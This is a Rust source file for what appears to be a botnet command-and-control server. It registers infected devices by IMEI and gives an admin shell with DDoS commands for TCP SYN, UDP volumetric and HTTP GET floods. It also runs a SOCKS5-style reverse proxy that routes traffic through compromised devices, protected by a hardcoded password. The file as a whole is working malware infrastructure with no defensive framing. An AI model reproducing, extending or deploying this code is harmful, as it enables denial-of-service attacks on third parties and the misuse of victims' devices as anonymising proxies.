mod proc;
mod communication;
mod cmd;

use std::net::{Ipv4Addr, Shutdown, TcpListener, TcpStream};
use std::{io, thread, time};
use std::collections::VecDeque;
use std::io::{copy, Read, Write};
use std::os::unix::raw::ino_t;
use std::str::FromStr;
use std::sync::{Arc, Mutex};
use std::time::SystemTime;
use serde::{Deserialize, Serialize};
use bson::raw::RawDocumentBuf;
use serde_json::{json, Value};
use crate::cmd::commend;
use crate::communication::ddos_frequency::*;
use crate::communication::common_frequency::*;
use crate::cmd::commend::*;
use crate::proc::c2::{count, wait_ok_sig};


static ADM_SHELL: &str = "root@1337:~$ ";
static REVERSE_PROXY_PASSWORD: &str = "1337";

pub type BOT_C2_CONNECTION = Arc<Mutex<Vec<Bot>>>;
pub type PROXY_BACKEND_CONNECTION = Arc<Mutex<Vec<Proxy>>>;
fn check_bot_existence(imei: u64, connection: &BOT_C2_CONNECTION) -> isize {
    for (i, conn) in connection.lock().unwrap().iter().enumerate() {
        if conn.imei == imei {
            let index = i as isize;
            return index;
        }
    }
    -1
}
fn check_proxy_sock_existence(imei: u64, connection: &PROXY_BACKEND_CONNECTION) -> isize {
    for (i, conn) in connection.lock().unwrap().iter().enumerate() {
        if conn.imei == imei {
            let index = i as isize;
            return index;
        }
    }
    -1
}
fn main() {

    let commend_ref: Value = json!({ // TODO export .json
            "!help": {
                "args_len": 0,
                "help": "!help => Introducing All C2 commands <3\n"
            },
            "!bots": {
                "args_len": 0,
                "help": "!bots => List of connected bots\n",
            },
            "!count": {
                "args_len": 0,
                "help": "!count => Count of connected bots\n",
            },
            "!air": {
                "args_len": 1,
                "help": "!air (imei) => reset LTE signal on device\n",
            },
            "!tcp": {
                "args_len": 3,
                "help": "!tcp (host) (port) (duration) => L4 tcp-syn\n",
            },
            "!udp": {
                "args_len": 3,
                "help": "!udp (host) (port) (duration) => L4 udp-vol\n"
            },
            "!http": {
                "args_len": 3,
                "help": "!http (domain) (port) (duration) => L7 http-get\n"
            },
            "!exit": {
                "args_len": 0,
                "help": "!exit => Exit of C2\n"
            },
            "!clear": {
                "args_len": 0,
                "help": "!clear => clear Terminal buf\n"
            }

    });


    let bot_connection: BOT_C2_CONNECTION = Arc::new(Mutex::new(Vec::<Bot>::new()));
    let proxy_connection: PROXY_BACKEND_CONNECTION = Arc::new(Mutex::new(Vec::<Proxy>::new()));

    let bot = TcpListener::bind("127.0.0.1:1337").unwrap();
    let proxy_backend = TcpListener::bind("127.0.0.1:7777").unwrap();
    let proxy_frontend = TcpListener::bind("0.0.0.0:7777").unwrap();

    // run backend
    let proxy_connection_clone: PROXY_BACKEND_CONNECTION = Arc::clone(&proxy_connection);
    thread::spawn(move || {
        for stream in proxy_backend.incoming() {
            match stream {
                Ok(mut stream) => {
                    let proxy_connection_clone: PROXY_BACKEND_CONNECTION = Arc::clone(&proxy_connection_clone);
                    thread::spawn(
                        move || {
                            handle_backend_proxy_stream(&stream, &proxy_connection_clone);
                        });
                },
                Err(_) => {
                    panic!();
                }
            }
        }
    });

    // run frontend
    let proxy_connection_clone: PROXY_BACKEND_CONNECTION = Arc::clone(&proxy_connection);
    let bot_connection_clone: BOT_C2_CONNECTION = Arc::clone(&bot_connection);
    thread::spawn(move || {
        for stream in proxy_frontend.incoming() {
            match stream {
                Ok(mut stream) => {
                    let proxy_connection_clone: PROXY_BACKEND_CONNECTION = Arc::clone(&proxy_connection_clone);
                    let bot_connection_clone: BOT_C2_CONNECTION = Arc::clone(&bot_connection_clone);
                    thread::spawn(
                        move || {
                            handle_frontend_proxy_stream(&stream, &proxy_connection_clone, &bot_connection_clone);
                        });
                }
                Err(_) => {
                    panic!();
                }
            }
        }
    });

    let adm = TcpListener::bind("127.0.0.1:1337").unwrap();
    let bot_connection_clone: BOT_C2_CONNECTION = Arc::clone(&bot_connection);
    thread::spawn(move || {
        for stream in adm.incoming() { // only support "1" admin session
            match stream {
                Ok(mut stream) => {
                    stream.write_all(
                        format!(
                            "{}\n{}",
                            "\u{001B}[2JWelcome C2! (!help)", ADM_SHELL
                        ).as_bytes()
                    ).unwrap();
                    loop {
                        let mut buf: [u8; 8192] = [0; 8192];
                        match stream.read(&mut buf) {
                            Ok(n) => {
                                if n == 0 { break; }
                                else if n == 5 && buf[0] == 255 && buf[1] == 244
                                    && buf[2] == 255 && buf[3] == 253 && buf[4] == 6 {
                                    break;
                                } // Ctrl+C
                                else if buf[0] != 33 {
                                    stream.write_all(ADM_SHELL.as_bytes()).unwrap();
                                    continue;
                                }
                                let commend = String::from_utf8(Vec::from(&buf[0..n])).unwrap();
                                let mut commend_fragmented: Vec<_> = commend.split(" ").collect();
                                let commend_prefix = commend_fragmented[0].trim();
                                let commend_args_len = check_commend_is_exist(&commend_ref, commend_prefix);

                                commend_fragmented.remove(0); // rm prefix

                                match commend_args_len {
                                    -1 => {
                                        stream.write_all("Unknown command... hmm.\n".as_bytes()).unwrap();
                                    } // 명령어 존재성 검증
                                    0..=127 => { // i8 positive number range
                                        if commend_fragmented.len() as i8 != commend_args_len {
                                            let help = check_commend_help(&commend_ref, commend_prefix);
                                            stream.write(help.as_bytes()).unwrap();
                                        } // 명령어 인자 유효성 검증
                                        else {
                                            commend::match_and_proceed(
                                                commend_prefix, &commend_fragmented,
                                                &commend_ref, &stream, &bot_connection_clone
                                            )
                                        }
                                    }
                                    _ => {}
                                }
                                match stream.write_all(ADM_SHELL.as_bytes()) {
                                    Ok(_) => {}
                                    Err(_) => {} // !exit 같은 shutdown 에서 트리거 됨
                                }
                            }
                            Err(_) => {
                                panic!()
                            }
                        }
                    }
                }
                Err(_) => {
                    panic!();
                }
            }
        }
    });

    for stream in bot.incoming() {
        match stream {
            Ok(mut stream) => {
                let bot_connection_clone: BOT_C2_CONNECTION = Arc::clone(&bot_connection);
                thread::spawn(
                    move || {
                        handle_bot_stream(&stream, &bot_connection_clone);
                    });
            }
            Err(_) => {
                panic!();
            }
        }
    }
}
fn handle_frontend_proxy_stream(
    mut stream: &TcpStream,
    proxy_connection: &PROXY_BACKEND_CONNECTION, bot_connection: &BOT_C2_CONNECTION
) {

    let mut init_buf: [u8; 4] = [0; 4];
    stream.read(&mut init_buf).unwrap();

    if init_buf[2] != 2 {
        stream.shutdown(Shutdown::Both).unwrap();
        return;
    }
    stream.write_all(&[0x5, 0x2]).unwrap();

    let mut auth_buf = [0; 32];
    stream.read(&mut auth_buf).unwrap();

    let version = auth_buf[0];
    let username_len: usize = auth_buf[1].to_string().parse().unwrap();
    let username = String::from_utf8(
        Vec::from(&auth_buf[2..(username_len + 2) as usize])
    ).unwrap();

    let password_len: usize = auth_buf[username_len+2].to_string().parse::<usize>().unwrap() + (username_len + 3);
    let password = String::from_utf8(
        Vec::from(&auth_buf[username_len + 3..password_len])
    ).unwrap();
    let username_u64: u64 = username.parse().unwrap(); // imei

    if check_bot_existence(username_u64, &bot_connection) == -1 || password.as_str() != REVERSE_PROXY_PASSWORD {
        stream.write_all(&[version, 0xff]).unwrap(); // 비번 틀림
        stream.shutdown(Shutdown::Both).unwrap();
        return;
    }
    stream.write_all(&[version, 0x00]).unwrap();

    let mut conn_buf: [u8; 4] = [0; 4];
    stream.read(&mut conn_buf).unwrap();

    if  conn_buf[1] != 1 {
        stream.shutdown(Shutdown::Both).unwrap();
        return;
    }
    let mut destination_ip_buf: [u8; 4] = [0; 4];

    let destination_ip_buf: [u8; 4] = match conn_buf[3] {
        1 => {
            stream.read(&mut destination_ip_buf).unwrap();
            destination_ip_buf
        },
        3 => {
            panic!() // TODO 프록시 서버에서 resolv
        },
        _ => {
            stream.shutdown(Shutdown::Both).unwrap();
            return;
        }
    };
    let mut destination_port_buf: [u8; 2] = [0; 2];
    stream.read(&mut destination_port_buf).unwrap();

    let now = SystemTime::now();
    loop {
        let mut index = check_proxy_sock_existence(username_u64, &proxy_connection);
        if index != -1 {
            let mut remote = proxy_connection.lock().unwrap().get(index as usize).unwrap().stream.try_clone().unwrap();
            proxy_connection.lock().unwrap().remove(index as usize);
            remote.write(&destination_ip_buf).unwrap(); // forward
            remote.write(&destination_port_buf).unwrap();

            let mut buf: [u8; 1] = [0; 1];
            match remote.read(&mut buf) {
                Ok(n) => {
                    if n == 0 {
                        continue
                    }
                    if buf[0] != 1 {
                        continue
                    }
                }
                Err(_) => {
                    continue
                }
            } // 여기서 끊어진 소켓 거르긴 하는데 이미 맺어진 소켓에서 데이터 교환중인건 어케 해야하ㅣㅈ 입

            let mut stream_clone = stream.try_clone().unwrap();
            let mut remote_clone = remote.try_clone().unwrap();
            thread::spawn(move || -> std::io::Result<()> {
                copy(&mut stream_clone, &mut remote_clone)?;
                Ok(())
            });
            let mut stream_clone = stream.try_clone().unwrap();
            let mut remote_clone = remote.try_clone().unwrap();
            thread::spawn(move || -> std::io::Result<()> { copy(&mut remote_clone, &mut stream_clone)?;
                Ok(())
            });
            break
        }
        match now.elapsed() {
            Ok(elapsed) => {
                if elapsed.as_secs() == 10 { // timeout
                    break
                }
                else {continue}
            }
            Err(_) => {
                panic!();
            }
        }
    }
}

fn handle_backend_proxy_stream(mut stream: &TcpStream, connection: &PROXY_BACKEND_CONNECTION) {
    loop {
        let mut buf: [u8; 1024] = [0; 1024];
        match stream.read(&mut buf) {
            Ok(n) => {
                let m: Message = bson::from_document(
                    RawDocumentBuf::from_bytes(buf[0..n].to_vec()).unwrap().to_document().unwrap()
                ).expect("-Incorrect packet Received!");
                if m.shellcode == PROXY_INIT_SIG {
                    connection.lock().unwrap().push(
                        Proxy {
                            imei: m.imei,
                            stream: stream.try_clone().unwrap(),
                        }
                    );
                    break;
                }
            }
            Err(_) => return
        }
    }
}
fn handle_bot_stream(mut stream: &TcpStream, connection: &BOT_C2_CONNECTION) {
    let mut imei: u64 = 0;
    loop {
        let mut buf: [u8; 1024] = [0; 1024];
        match stream.read(&mut buf) {
            Ok(n) => {
                if n == 0 {
                    let i = check_bot_existence(imei, &connection);
                    if i != -1 {
                        connection.lock().unwrap().remove(i as usize);
                        println!("-Bot Disconnected({}, {})", i, imei);
                    }
                    break;
                }
                let m: Message = bson::from_document(
                    RawDocumentBuf::from_bytes(buf[0..n].to_vec()).unwrap().to_document().unwrap()
                ).expect("-Incorrect packet Received!");

                if m.shellcode == C2_INIT_SIG { // CNC connected!

                    let i = check_bot_existence(m.imei, &connection);
                    if i != -1 {
                        connection.lock().unwrap().remove(i as usize);
                        println!("-Duplicate Bot has been deleted({}, {})", i, m.imei);
                    }

                    println!("+New Bot incoming! ({})", m.imei);
                    if imei == 0 {
                        imei = m.imei.clone();
                    }

                    connection.lock().unwrap().push(
                        Bot {
                            imei: m.imei,
                            peer: stream.peer_addr().unwrap().clone().to_string(),
                            stream: stream.try_clone().unwrap()

                        }
                    );
                    break;
                }
            }
            Err(_) => {
                let i = check_bot_existence(imei, &connection);
                if i != -1 {
                    connection.lock().unwrap().remove(i as usize);
                    println!("-Bot Disconnected({}, {})", i, imei);
                }
                break;
            }
        }
    }
}